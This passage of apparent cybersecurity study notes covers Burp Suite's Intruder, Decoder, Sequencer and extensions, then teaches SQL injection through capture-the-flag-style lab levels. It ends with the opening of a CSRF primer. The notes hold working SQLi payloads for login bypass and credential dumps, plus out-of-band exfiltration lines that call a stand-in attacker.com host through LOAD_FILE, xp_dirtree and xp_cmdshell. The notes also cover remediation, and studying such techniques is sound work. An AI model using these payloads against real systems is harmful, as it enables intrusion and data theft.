**Positions tab** — mark where payloads get inserted using `§` markers (e.g. `username=§admin§&password=§test§`). Burp auto-highlights likely candidates (parameter values, cookies) when a request first loads, but review and adjust manually — auto-selection is a starting point, not the final word.

**Attack types** — this is the core concept to understand:

|Attack Type|Payload Sets|Behaviour|
|---|---|---|
|**Sniper**|1 set|Cycles through the payload list, testing **one position at a time**, others held at original value. Requests = (positions) × (payloads per set). Good for fuzzing single parameters one by one.|
|**Battering ram**|1 set|Same payload inserted into **all positions simultaneously** on each request. Good when the same value belongs in multiple places (e.g. a username field repeated in both a header and body).|
|**Pitchfork**|Multiple sets (one per position)|Payload sets march **in parallel**, position 1 takes list 1's item N, position 2 takes list 2's item N, same N each request. Good for paired data (username list + matching password list).|
|**Cluster bomb**|Multiple sets (one per position)|Tests **every combination** of payload sets across positions — full cartesian product. Classic credential brute-force: every username against every password. Generates the most requests.|

**Payload types (Payloads tab):**

- **Simple list** — a manually entered or pasted wordlist
- **Runtime file** — load a wordlist file directly (e.g. `rockyou.txt`, SecLists)
- **Numbers** — a numeric range/step, useful for ID enumeration (IDOR at scale) or numeric brute-forcing
- **Character substitution / case modification / custom iterators** — more advanced generation for specific fuzzing needs

**Reading results — the columns that matter:**

- **Status code** — the fastest filter; a login brute-force often shows one anomalous status among a wall of identical ones
- **Length** — response length differences are often more reliable than status code alone (e.g. a "wrong password" page and a "logged in" page can both return `200`, but different lengths)
- **Response time** — can reveal blind conditions (time-based SQLi, account lockout thresholds, rate limiting behaviour)
- **Grep — Match** (Options/Settings tab) — search every response for a specific string (e.g. `"Welcome back"`, `"Invalid password"`) and flag which requests contain it, turning a wall of responses into a simple yes/no column
- **Grep — Extract** — pull a specific value out of each response (e.g. a token, an error message) into its own column for quick scanning

**Sorting any column** (click the header) is often the single fastest way to spot the one result that doesn't match the pattern.

> [!warning] Community edition speed Intruder in Community edition is deliberately throttled — large wordlists (full `rockyou.txt`-scale attacks) will take a long time. For lab/CTF work, keep payload lists tight and targeted rather than exhaustive; for real engagements needing speed, that's part of what Professional pays for.

> [!summary] Quick Recap — Intruder
> 
> - 4 attack types: **Sniper** (1 list, 1 position at a time), **Battering ram** (1 list, all positions at once), **Pitchfork** (parallel lists, paired), **Cluster bomb** (parallel lists, every combination)
> - Mark payload positions with `§...§`; auto-selection is a starting suggestion, not final
> - Payload types: simple list, runtime file (wordlist), numbers (great for IDOR), and generators
> - Filter results by status code and length first; use **Grep Match/Extract** to turn responses into a scannable column
> - Community edition is rate-limited — keep wordlists targeted, not exhaustive

---

### Burp Suite: Other Modules

Burp includes several tools beyond Repeater/Intruder that solve specific, narrower problems. Each has a clear "reach for this when..." trigger.

**Decoder** — encode/decode/hash data through a chain of transforms (URL, HTML, Base64, ASCII hex, MD5, SHA-1/256, etc.), stackable in either direction.

- _Reach for it when:_ a parameter value looks encoded/obfuscated and you need to read or manipulate the underlying data (a Base64 cookie, a URL-encoded payload, a hash you want to verify against a wordlist).
- Two panes let you decode top-to-bottom or re-encode bottom-to-top, and each transform layer is independently reversible.

**Comparer** — diffs two pieces of data (words or bytes) side by side, highlighting exactly what changed.

- _Reach for it when:_ comparing two responses that should be identical but aren't (e.g. valid vs invalid session, two near-identical Repeater responses) and eyeballing the diff isn't reliable enough — especially useful for whitespace-level or structurally subtle differences.
- Send directly from Proxy/Repeater via **Send to Comparer**, or paste manually.

**Sequencer** — analyses the randomness/entropy of tokens (session IDs, CSRF tokens, password reset tokens) by capturing many samples and running statistical tests on them.

- _Reach for it when:_ assessing whether a token generation scheme is predictable enough to brute-force or guess — weak session token entropy is a real, reportable finding.
- Feed it a live request that returns a fresh token each time, let it collect a large sample, then review the entropy analysis (bits of entropy per character, overall quality rating).

**Logger** (and the enhanced Logger++ extension) — a more detailed, filterable, searchable log of all traffic than the standard Proxy history, useful on larger applications where HTTP history becomes unwieldy.

- _Reach for it when:_ HTTP history search/filter isn't cutting it and you need advanced querying across a long session.

**Target → Site map** (revisited) — beyond a passive tree view, right-clicking nodes here gives access to **Engagement tools**: "Find comments," "Find scripts," "Analyze target," "Discover content" (Professional-only content discovery/spidering) — useful for a structural pass over an app before diving into manual testing.

**Burp Scanner** (Professional only) — automated vulnerability scanning (crawl + audit) across an app or a defined scope. Not available in Community; the manual tools above are effectively Community's substitute for what Scanner automates.

> [!summary] Quick Recap — Other Modules
> 
> - **Decoder** — encode/decode/hash chains; use on obfuscated parameter values, cookies, hashes
> - **Comparer** — precise diff between two responses/requests; use when eyeballing isn't reliable enough
> - **Sequencer** — statistical randomness testing on tokens; use to assess session/CSRF/reset-token predictability
> - **Logger** — deeper, filterable traffic log beyond standard HTTP history
> - **Site map → Engagement tools** — structural recon pass (comments, scripts, content discovery) over a target
> - **Scanner** is Professional-only automated crawl+audit; Community relies on the manual toolset above

---

### Burp Suite: Extensions

**What extensions are:** third-party (and some PortSwigger-authored) add-ons that extend Burp's functionality — new tabs, new scan checks, new payload generators, automation helpers. Installed and managed through the **Extensions** tab (formerly called "Extender" in older Burp versions).

**The BApp Store** — **Extensions → BApp Store**, Burp's built-in marketplace of vetted extensions. Browse, read descriptions/ratings, and install with one click — no manual setup required for anything listed here.

**Manually loaded extensions** — for extensions not in the BApp Store (custom/internal tools, extensions requiring a specific language runtime setup), load via **Extensions → Installed → Add**, pointing to a `.jar` (Java), `.py` (Python, via Jython), or `.rb` (Ruby, via JRuby) file.

> [!note] Runtime requirements Python and Ruby extensions need **Jython**/**JRuby** configured under **Extensions → Extensions settings** (pointing Burp at the standalone Jython/JRuby `.jar`) before they'll load — a common first-time stumbling block if an extension silently fails to activate.

**Commonly used extensions worth knowing by name:**

|Extension|What It Does|
|---|---|
|**Logger++**|Enhanced, filterable, exportable traffic logging beyond default HTTP history|
|**Autorize**|Automates authorization testing — replays requests as a lower-privileged user's session to catch broken access control/IDOR at scale|
|**JSON Web Tokens (JWT Editor)**|Decode, edit, and re-sign JWTs directly in the request editor — essential for JWT-based auth testing|
|**Turbo Intruder**|Scripted, high-performance request sender for scenarios where standard Intruder is too slow or too rigid (race conditions, large-scale fuzzing)|
|**Param Miner**|Discovers hidden/unlinked parameters a server responds to, by intelligently guessing and diffing responses|
|**Active Scan++**|Adds extra active/passive scan checks on top of Burp Scanner (Professional)|
|**Hackvertor**|Advanced tag-based encoding/obfuscation, useful for building layered/nested payloads that Decoder alone can't easily produce|

**Why extensions matter for a workflow:** the core suite (Proxy/Repeater/Intruder/Decoder/Comparer) covers manual testing well, but extensions close specific, recurring gaps — batch authorization testing (Autorize), JWT manipulation (JWT Editor), hidden parameter discovery (Param Miner) — that would otherwise mean a lot of repetitive manual Repeater work.

**Installing from the BApp Store — quick steps:**

1. **Extensions → BApp Store**
2. Search/select the extension
3. **Install**
4. Confirm it appears and is enabled under **Extensions → Installed**
5. New functionality typically appears as a new top-level tab, or as extra right-click context menu options in existing tools

> [!summary] Quick Recap — Extensions
> 
> - **BApp Store** = one-click installs for vetted extensions; manual load (`.jar`/`.py`/`.rb`) for anything else
> - Python/Ruby extensions need Jython/JRuby configured first, or they'll silently fail to load
> - Know these by name: **Logger++**, **Autorize** (authz/IDOR automation), **JWT Editor**, **Turbo Intruder** (fast scripted attacks), **Param Miner** (hidden param discovery), **Hackvertor** (advanced encoding)
> - Extensions plug the recurring gaps in manual testing — especially batch authorization checks and JWT work

---

> [!summary] Full Burp Suite Topic — One Glance
> 
> - **Proxy** = the foundation: intercept traffic, install the CA cert for HTTPS, HTTP history logs everything regardless of intercept state
> - **Repeater** = manual, iterative single-request testing — the default home for parameter tampering, IDOR checks, and payload iteration
> - **Intruder** = automated multi-request testing — know the 4 attack types (Sniper/Battering ram/Pitchfork/Cluster bomb) and filter results by status/length/grep
> - **Decoder/Comparer/Sequencer** = narrow-purpose tools: decode obfuscated data, diff near-identical responses, test token entropy
> - **Extensions** = BApp Store one-click installs close specific gaps (Autorize for authz, JWT Editor for tokens, Param Miner for hidden params)
> - General workflow: browse target with Proxy → send interesting requests to Repeater to explore manually → escalate to Intruder once you know what to automate → reach for Decoder/Comparer/Sequencer/extensions as specific needs come up

## 8. Web Application Vulnerabilities I

### SQL Injection Introduction

> [!info] Room context SQL Injection (SQLi) — OWASP **A05:2025 – Injection**. Occurs when attacker-supplied input is incorporated into a SQL query without proper sanitisation/parameterisation, letting the attacker alter query logic instead of just supplying data. Consequences range from unauthorised data access to full authentication bypass to complete database compromise. This room builds from core SQL syntax → detection → every major SQLi type → remediation, using **MySQL syntax throughout** (other engines share the concepts but differ in comment syntax, system tables, and functions).

> [!info] Prerequisites Comfortable with `SELECT`, `FROM`, `WHERE`, `ORDER BY` (Database SQL Basics room).

#### SQL Essentials for Injection

The building blocks that make injection payloads work, beyond basic query syntax.

**Comments** — tell the database to ignore everything after them on the line. MySQL: `--` (double dash **followed by a space**) or `#` for single-line; `/* */` for multi-line.

Why it matters: injecting mid-query usually leaves leftover original SQL that would error out. A comment cleanly cuts it off.

```sql
-- Original:
SELECT * FROM users WHERE username='INPUT' AND password='secret';

-- Injecting admin'-- as username:
SELECT * FROM users WHERE username='admin'-- AND password='secret';
-- everything after -- is ignored; password check never runs
```

**`UNION`** — combines results of two+ `SELECT` statements into one result set. **Hard rule: both statements must return the same number of columns**, with compatible data types.

```sql
SELECT name, age FROM students UNION SELECT username, id FROM admins;
```

This is the foundation of Union-Based SQLi — appending an attacker-controlled `SELECT` to a legitimate query to pull data from any table. If the original query selects 3 columns, the injected `UNION SELECT` must select exactly 3 values.

**`LIKE` and wildcards** — pattern matching. `%` = any sequence of characters, `_` = exactly one character.

```sql
SELECT * FROM users WHERE username LIKE 'adm%';   -- matches admin, administrator, etc.
```

Used heavily in Blind SQLi to enumerate data one character at a time (`LIKE 'a%'`, `LIKE 'b%'`... until a match).

**`LIMIT`** — restricts rows returned. `LIMIT offset, count` skips rows and controls output size.

```sql
SELECT * FROM users LIMIT 1;       -- first row only
SELECT * FROM users LIMIT 2, 1;    -- skip 2, return the 3rd
```

**String functions:**

- `group_concat()` — aggregates values from multiple rows into a single comma-separated string in one shot:
    
    ```sql
    SELECT group_concat(username, ':', password SEPARATOR '<br>') FROM users;-- admin:pass123<br>martin:secret<br>jim:work456
    ```
    
- `CONCAT()` — joins individual values for a single row: `CONCAT(username, ':', password)` → `admin:pass123`

**`information_schema`** — a built-in database (MySQL/MariaDB/PostgreSQL) holding metadata about every other database on the server: database names, table names, column names, data types. The database's map of itself.

- `information_schema.tables` — every table; `table_schema` = database name, `table_name` = table name
- `information_schema.columns` — every column; `table_name` + `column_name` reveal any table's structure

This is how Union-Based injection goes from "I can inject" to "I know every table and column in this database."

> [!note] Engine portability This room is MySQL throughout. MSSQL, PostgreSQL, SQLite, and Oracle each have different comment syntax, system tables, and functions — but the _concepts_ transfer directly. Master MySQL injection first; adapting to other engines is mostly a syntax swap.

> [!summary] Quick Recap — SQL Essentials
> 
> - `--` (with trailing space) or `#` comments out the rest of the line — cuts off leftover original query syntax
> - `UNION` requires matching column counts between the original and injected `SELECT`
> - `LIKE` + `%`/`_` wildcards = the core mechanism for blind, character-by-character enumeration
> - `group_concat()` flattens multiple rows into one string — critical when you only have one output column to work with
> - `information_schema.tables`/`.columns` = the database's self-documentation, and the path from "injectable" to "full schema knowledge"

---

#### What Is SQL Injection

**The mechanism:** user-supplied input gets incorporated directly into a SQL query without sanitisation/parameterisation. The input is treated as **SQL code**, not just data — letting the attacker alter the query's logic.

**How web apps normally use SQL** — a URL like `https://website.thm/article?id=1` typically maps directly into a query:

```sql
SELECT * FROM articles WHERE id = 1 AND public = 1;
```

**Where it breaks** — when the server builds the query by directly concatenating user input into the SQL string:

```php
$query = "SELECT * FROM articles WHERE id = " . $_GET['id'] . " AND public = 1;";
```

Changing the URL to `?id=1 OR 1=1--` turns the query into:

```sql
SELECT * FROM articles WHERE id = 1 OR 1=1-- AND public = 1;
```

`OR 1=1` makes the `WHERE` clause always true; `--` comments out the `AND public = 1` check. Every article — including private ones — comes back.

**Three categories, based on how feedback reaches the attacker:**

|Category|Subtype|Feedback Channel|
|---|---|---|
|**In-Band**|Error-Based|Database error messages leak structural info|
||Union-Based|Injected `UNION SELECT` output appears directly in the page|
|**Blind**|Authentication Bypass|Login succeeds/fails based on the injected query|
||Boolean-Based|Response content subtly differs (true/false)|
||Time-Based|`SLEEP()` introduces delay — slow = true, fast = false|
|**Out-of-Band**|—|DB server makes an external network request (e.g. DNS) that exfiltrates data through a separate channel|

**Detection — test every input touching the database:** URL parameters, form fields (login, search, comments), cookies, HTTP headers.

- Inject `'` → a database error suggests unsanitised insertion into a query
- Try `"` → some queries use double quotes instead
- Inject `;--` → behavioural change confirms comment syntax is being processed
- Test `OR 1=1` → a results change confirms the input sits directly in query logic

If no error is visible (errors suppressed), fall back to behavioural differences (Boolean-Based) or timing delays (Time-Based) to confirm injection.

> [!summary] Quick Recap — What Is SQL Injection
> 
> - Vulnerability exists wherever user input is concatenated straight into a query string instead of parameterised
> - Three categories by feedback channel: **In-Band** (visible), **Blind** (inferred from behaviour/timing), **Out-of-Band** (exfil via a separate network channel)
> - Test every input surface: URL params, forms, cookies, headers
> - `'`, `"`, `;--`, `OR 1=1` are the four go-to detection probes

---

#### In-Band SQL Injection

"In-Band" = the channel you inject through is the same channel you read results from. Most common and easiest category to exploit.

#### Error-Based SQL Injection

Exploits raw database error messages shown to the user. A misconfigured app leaking errors hands over query structure, table names, and sometimes data.

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL 
server version for the right syntax to use near ''1'' at line 1
```

This single message confirms: the engine is MySQL, input is wrapped in single quotes, and errors aren't handled gracefully — enough to start crafting more precise payloads.

#### Union-Based SQL Injection

The primary method for extracting large amounts of data. A consistent, repeatable methodology:

**Step 1 — determine column count.** Increment `UNION SELECT` values until the error disappears:

```sql
1 UNION SELECT 1          -- error
1 UNION SELECT 1,2        -- error
1 UNION SELECT 1,2,3      -- success — 3 columns
```

**Step 2 — identify which columns render on the page.** Force the original query to return nothing (e.g. ID `0`) so only the `UNION` output shows:

```sql
0 UNION SELECT 1,2,3
```

Whichever number appears in the visible content area is your **extraction column**.

**Step 3 — extract the database name:**

```sql
0 UNION SELECT 1,2,database()
```

**Step 4 — enumerate tables** via `information_schema.tables`:

```sql
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'database_name'
```

**Step 5 — enumerate columns** of a target table via `information_schema.columns`:

```sql
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'target_table'
```

**Step 6 — extract the data:**

```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM target_table
```

> [!note] Why each step works Column count must match — that's how `UNION` is defined at the SQL level. `0`/`-1` as the ID forces the original query empty so your injected row is what actually renders. `information_schema` is queried because it's the database's own structural catalogue — no guessing table/column names required.

> [!summary] Quick Recap — In-Band SQLi
> 
> - Error-Based: read the leaked error text itself for engine type, quoting style, and structure hints
> - Union-Based methodology is always the same 6 steps: column count → visible column → `database()` → tables → columns → data
> - `0`/`-1` as the base ID is the standard trick to blank out the legitimate row and force your `UNION` output to render instead

---

#### Blind SQL Injection: Authentication Bypass

**What makes it "blind":** the injection still executes, but there's no visible query output or error message — only an inferred signal (logged in or not, page changed or not, fast or slow).

**How login queries normally work:**

```sql
SELECT * FROM users WHERE username='bob' AND password='secret123' LIMIT 1;
```

Row returned → valid credentials → logged in. No row → "Invalid credentials." **The actual query results are never displayed** — just success/failure.

**The attack — you don't need valid credentials, only a query that returns ≥1 row.** Username `' OR 1=1;--`, anything in the password field:

```sql
SELECT * FROM users WHERE username='' OR 1=1;--' AND password='anything' LIMIT 1;
```

- `username=''` — no match on its own
- `OR 1=1` — always true, makes the entire `WHERE` clause true
- `;--` — ends the statement, comments out everything after, including the password check
- Database returns **every row** → app sees rows exist → logs you in as the first user (often admin)

**Targeting a specific known username** — `admin'--`:

```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything' LIMIT 1;
```

Password check fully commented out; you're logged in as `admin` with zero knowledge of the password.

**Payload variations to try:**

- `' OR 1=1;--` — classic, single-quote-wrapped input
- `' OR 1=1#` — MySQL `#` comment variant
- `" OR 1=1--` — double-quote-wrapped queries
- Test **both** username and password fields — some apps only concatenate one of the two unsanitised

**Field detection habit:** try `' OR 1=1;--` in the username field with any password on every login form you test — it's one of the fastest, cheapest checks in a pentest.

> [!summary] Quick Recap — Auth Bypass
> 
> - No data is ever shown here — the "signal" is purely login success or failure, which still counts as Blind SQLi
> - `' OR 1=1;--` forces the `WHERE` clause true and comments out the password check → logs in as the first user
> - `admin'--` (or a known username) targets a specific account without knowing its password
> - Try the payload in both username AND password fields — only one may be the actual injectable one

---

#### Blind SQL Injection: Boolean-Based and Time-Based

For extracting actual data (not just bypassing login) when the app gives no visible output.

#### Boolean-Based Blind SQLi

Relies on a **binary signal** the app already gives you — different content, a JSON flag like `{"taken":true}`/`{"taken":false}`, or any true/false distinction — used to ask the database yes/no questions.

**Example scenario:** a username-check endpoint. `?username=admin` → `{"taken":true}`; `?username=admin123` → `{"taken":false}`. Underlying query, roughly:

```sql
SELECT * FROM users WHERE username = '%username%' LIMIT 1;
```

**Step 1 — confirm injection** with an always-true condition:

```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
```

`%` matches anything → should return `true`. Confirms injection works.

**Step 2 — extract the database name, character by character:**

```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--   -- false
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'b%';--   -- ...keep going
```

When a letter flips the response to `true`, lock it in and move to the next character position (`sa%`, `sb%`, `sc%`...), narrowing until the full name is recovered.

**Step 3 — table and column names** — same technique against `information_schema.tables`/`.columns`, then finally against actual data values in the target table.

This is slow (multiple requests per character) but reliable — it works even when every other output channel is locked down.

#### Time-Based Blind SQLi

For when there's genuinely **no visible difference at all** — identical content, status code, headers, regardless of input. The only signal left is response **timing**.

MySQL's `SLEEP()` pauses execution for N seconds, wrapped in a condition so the pause only happens when that condition is true:

```sql
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--
```

Database name starts with `s` → ~5 second delay. Otherwise → instant response.

**Step 1 — find column count** (same idea as Union-Based, watching for delay instead of error):

```sql
admin123' UNION SELECT SLEEP(5);--        -- no delay, wrong count
admin123' UNION SELECT SLEEP(5),2;--      -- 5s delay — 2 columns confirmed
```

**Step 2 — enumerate data** identically to Boolean-Based, but reading the clock instead of the page: delay = true, no delay = false.

> [!warning] Network latency can lie to you A flaky connection's natural lag can look like a successful `SLEEP()`. Use longer sleep values (5–10s) and repeat each character test once or twice to be sure. MSSQL equivalent: `WAITFOR DELAY '0:0:5'`.

**Choosing a technique:**

|Scenario|Technique|
|---|---|
|App shows different content for true vs false|Boolean-Based|
|App response looks identical no matter what|Time-Based|
|Time-based blocked/too unreliable|Out-of-Band|

> [!summary] Quick Recap — Boolean & Time-Based
> 
> - Boolean-Based needs _some_ observable true/false difference in the response — reads it directly
> - Time-Based needs nothing visible at all — `SLEEP()` wrapped in a condition, delay = true
> - Both use the same character-by-character `LIKE` narrowing technique — only the "read the answer" step differs
> - Time-based is the slowest and most request-heavy — sanity-check against network noise before trusting a result

---

#### Out-of-Band SQL Injection

Different mechanism entirely: instead of reading results through the web response, force the database server to reach out to an attacker-controlled server through a **separate channel** (usually DNS or HTTP), carrying stolen data with it.

**When to reach for it — everything else has failed:**

- In-Band: no visible query results or errors
- Boolean-Based: response looks identical regardless of condition
- Time-Based: too unreliable (noisy network) or `SLEEP()` is blocked
- **Requirement:** the database server itself must be able to make outbound network connections — if outbound traffic is firewalled off, OOB is dead on arrival

**Two channels involved:**

1. **Attack channel** — your normal web request carrying the injection payload
2. **Data channel** — an outbound DNS/HTTP request the DB server makes to your server, with exfiltrated data embedded in the request itself

**DNS exfiltration with MySQL** — `LOAD_FILE()` triggers a DNS lookup via a UNC path with data baked into the subdomain:

```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));
```

1. `(SELECT database())` → e.g. `webapp_db`
2. `CONCAT()` builds `\\webapp_db.attacker.com\share`
3. `LOAD_FILE()` attempts to read that path — on Windows this triggers DNS resolution for `webapp_db.attacker.com`
4. Attacker's DNS server logs the request; `webapp_db` is sitting right there in the subdomain

Works best on Windows-hosted MySQL, where UNC paths trigger DNS resolution.

**MSSQL techniques** — more direct via stored procedures:

```sql
EXEC master..xp_dirtree '\\attacker.com\share';
```

Triggers a DNS lookup by attempting to list a remote directory.

```sql
EXEC xp_cmdshell 'nslookup data.attacker.com';
```

Runs OS commands directly if `xp_cmdshell` is enabled — off by default on modern MSSQL, but `xp_dirtree` remains available and shows up regularly in pentests.

**Catching the exfiltrated data:**

- **Burp Collaborator** — unique subdomain, logs any DNS/HTTP callback to it
- **Interactsh** (ProjectDiscovery) — same idea, free and self-hostable
- **Custom listener** — a Python DNS server (`dnslib`) or bare HTTP server for full control

**Limitations:**

- Needs outbound access from the DB server (often restricted in production)
- Payloads are engine-specific — MySQL, MSSQL, PostgreSQL all differ
- DNS subdomain labels are capped at 63 characters — a real size constraint on exfil chunks
- Generally slower and flakier than direct extraction

> [!summary] Quick Recap — Out-of-Band
> 
> - Last resort when In-Band, Boolean, and Time-Based are all dead ends — and only works if the DB server can reach the internet
> - Two channels: attack request in, DNS/HTTP callback out — data rides inside the callback (e.g. a subdomain)
> - MySQL: `LOAD_FILE()` + UNC path; MSSQL: `xp_dirtree` (usually available) or `xp_cmdshell` (usually disabled)
> - Burp Collaborator / Interactsh are the standard catchers — no need to stand up your own DNS server unless going custom

---

#### Remediation and Prevention

Knowing the fix matters as much as knowing the exploit — a pentest report needs the remediation, not just the finding.

**Prepared statements (parameterised queries) — the real fix.** Separates SQL code from data entirely; the database receives user input as data only, never as executable SQL.

```php
// Vulnerable
$query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "'";
$result = mysqli_query($conn, $query);

// Fixed (PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_POST['username']]);
$result = $stmt->fetchAll();
```

```python
# Vulnerable
query = f"SELECT * FROM users WHERE username='{username}'"
cursor.execute(query)

# Fixed
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

Every language/framework supports this pattern. `?`/`%s` placeholders mean user input **physically cannot** alter query structure — even `' OR 1=1--` is treated as a literal string.

**Input validation** — allowlist what's valid, reject everything else:

```php
if (!ctype_digit($_GET['id'])) {
    die("Invalid input");
}
```

> [!warning] Never validation alone Use alongside prepared statements, not instead of them. **Blocklisting** (filtering out `'`, `--`, etc.) is brittle — double encoding, alternate syntax, or an uncovered edge case will get past it.

**Escaping user input** — backslash special characters (`'` → `\'`) so they're treated as literals. Fragile and database-specific (every engine has different rules). Last-resort option — e.g. legacy code that can't be refactored to prepared statements.

**Principle of least privilege** — defence-in-depth for when prevention fails:

- Read-only app? The DB account gets `SELECT` only, nothing else
- Never connect as `root`/`sa` from the application layer
- Lock sensitive tables down to only the procedures that need them

If SQLi does get exploited through a low-privilege account, the attacker can't `DROP` tables, reach other databases, or run system commands.

**Web Application Firewalls (WAFs)** — inspect requests, block known patterns (`' OR 1=1`, `UNION SELECT`, `information_schema`). **Not a substitute for secure code** — experienced attackers bypass WAFs with encoding tricks, alternate syntax, and obfuscation. Treat as an extra layer, not the defence.

> [!summary] Quick Recap — Remediation
> 
> - **Prepared statements/parameterised queries** = the actual fix; everything else is defence-in-depth
> - Allowlist input validation, never blocklist alone
> - Escaping is a fragile last resort for legacy code only
> - Least privilege limits blast radius even if injection succeeds
> - WAFs are a layer, not a substitute — bypassable by a competent attacker

---

#### Practice Walkthrough — 4 Sequential Levels

Each level isolates one technique from the tasks above. SQL Query box updates live as you type — watch it. Levels unlock sequentially; flags appear at the top of each new level.

##### Level 1 — Union-Based SQLi (In-Band)

Target: `https://website.thm/article?id=1`. Base query: `select * from article where id =`

```sql
1 UNION SELECT 1          -- error
1 UNION SELECT 1,2        -- error
1 UNION SELECT 1,2,3      -- success — 3 columns confirmed
```

```sql
0 UNION SELECT 1,2,3
```

ID `0` blanks the real article; `3` renders in the content area → extraction column.

```sql
0 UNION SELECT 1,2,database()
-- database: sqli_one

0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
-- reveals staff_users table

0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
-- columns: id, username, password

0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
-- full credential dump; find Martin's password → Answer box → flag
```

##### Level 2 — Authentication Bypass

Target: `https://website.thm/login`. Base query: `select * from users where username='' and password='' LIMIT 1;`

Username: `' OR 1=1;--`, any password:

```sql
select * from users where username='' OR 1=1;--' and password='anything' LIMIT 1;
```

`OR 1=1` forces the `WHERE` true; `--` strips the password check entirely. Login succeeds as the first user → flag.

##### Level 3 — Boolean-Based Blind SQLi

Two mock browsers: a checkuser API (`{"taken":true/false}`) and a login form. Base query: `select * from users where username = '%username%' LIMIT 1;`

```sql
admin123' UNION SELECT 1,2,3 where database() like '%';--        -- true, confirms injection
admin123' UNION SELECT 1,2,3 where database() like 's%';--       -- true
admin123' UNION SELECT 1,2,3 where database() like 'sq%';--      -- true
-- ...narrowing continues...
-- database name: sqli_three
```

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'u%';--
-- narrows to table: users

admin123' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_name = 'users' and column_name like 'u%';--
-- columns: username, password

admin123' UNION SELECT 1,2,3 from users where username like 'a%';--
-- narrows to username: admin

admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '3%';--
-- narrows to password: 3845
```

Log in with `admin` / `3845` → flag.

##### Level 4 — Time-Based Blind SQLi

Injection point: **Referrer header**. Response is visually identical regardless of input — timing is the only signal.

```sql
admin123' UNION SELECT SLEEP(5);--        -- instant, wrong column count
admin123' UNION SELECT SLEEP(5),2;--      -- 5s delay — 2 columns confirmed
```

```sql
admin123' UNION SELECT SLEEP(5),2 where database() like 's%';--     -- delay
admin123' UNION SELECT SLEEP(5),2 where database() like 'sq%';--    -- delay
-- ...continues character by character...
admin123' UNION SELECT SLEEP(5),2 where database() like 'sqli_four';--  -- delay, no trailing % = complete
-- database name: sqli_four
```

Same `information_schema` flow as Level 3, but every check is a `SLEEP()` delay instead of a boolean read — find the `users` table and its columns.

```sql
admin123' UNION SELECT SLEEP(3),2 from users where username='admin' and password like '4%';--
-- delay each step: 4, 49, 496, 4961, 4961 (no wildcard) = complete
```

Log in with `admin` / `4961` → final flag.

> [!note] What actually happened in Level 4 A full credential set extracted without the application ever returning a single byte of database content — no data on the page, no error, no boolean signal. Every digit came from measuring 3-second delays across dozens of requests. That's the essence of time-based blind SQLi: you don't read the data, you **deduce** it from timing. In real engagements, SQLmap automates this character enumeration — doing it manually once builds the intuition for when and why it breaks (rate limiting, WAFs, noisy networks) so you can adapt when automated tools get blocked.

> [!summary] Quick Recap — Practice Levels
> 
> - L1 (Union): column count → blank the real row → `database()` → tables → columns → `group_concat()` dump
> - L2 (Auth Bypass): `' OR 1=1;--` in username, any password — no data ever seen, just a login success signal
> - L3 (Boolean): character-by-character `LIKE` narrowing, reading a JSON true/false field
> - L4 (Time-Based): identical technique to L3, but reading `SLEEP()` delays instead — slowest, most request-heavy, works when literally nothing else does

---

> [!summary] Full SQL Injection Room — One Glance
> 
> - Root cause: user input concatenated into a query instead of parameterised — input becomes code, not just data
> - Detection: `'`, `"`, `;--`, `OR 1=1` across every input surface (params, forms, cookies, headers)
> - **In-Band**: Error-Based (read the leak) / Union-Based (6-step methodology: columns → visible column → `database()` → tables → columns → data)
> - **Blind**: Auth Bypass (`' OR 1=1;--`) / Boolean-Based (true/false signal + `LIKE` narrowing) / Time-Based (`SLEEP()` + same narrowing, read via timing)
> - **Out-of-Band**: last resort, needs outbound DB access, exfiltrates via DNS/HTTP callback (Burp Collaborator/Interactsh)
> - **Fix**: prepared statements are the only real fix; validation, escaping, least privilege, and WAFs are defence-in-depth, not substitutes

### CSRF Introduction

> [!info] Room context Cross-Site Request Forgery (CSRF) — tricks an already-authenticated victim's browser into performing actions on a site it's logged into, without the victim's knowledge. Not a credential-theft attack; it abuses the trust relationship between browser and app (specifically, that browsers auto-attach cookies to every request regardless of _where_ that request originated). Lab target: **StaffHub**, an internal employee portal for updating account settings (email, role/preferences).

> [!info] Access notes Both AttackBox and target VM must be running (1–2 min for target auto-run scripts). Use the domain `staffhub.thm:8080`, not the raw IP. Chrome keyring pop-up on launch → click **Cancel**, it's harmless.

#### What Is CSRF

**Core idea:** a session cookie acts like an identity card — the browser auto-includes it on every request to that domain, regardless of whether the request originated from a legitimate page on the site or a malicious page elsewhere on the internet. CSRF exploits exactly that auto-inclusion behaviour.

**Attack flow, three steps:**

1. Victim logs into the legitimate app → browser stores a session cookie
2. Attacker lures the victim to a malicious webpage containing a crafted request
3. Victim's browser automatically fires that request at the target app, **cookie included** — server sees a valid session and processes it as legitimate

**Why it's dangerous:** any state-changing feature is fair game — changing an email address, updating account settings, financial transactions, modifying security preferences. The victim never intended the action; the app processes it anyway because the request _looks_ legitimate at the cookie level.

> [!summary] Quick Recap — What Is CSRF
> 
> - Attacker doesn't need credentials — just needs the victim's browser to fire a request while the victim is already authenticated
> - The browser's automatic cookie attachment (same-domain, regardless of request origin) is the exact mechanism being abused
> - Any state-changing endpoint (settings, email, role, transactions) is a potential target

---

#### Why CSRF Works

**Not a browser bug** — browsers behave exactly as designed. The failure is on the **application** side: trusting a request just because it carries a valid session cookie, without checking where the request actually came from.

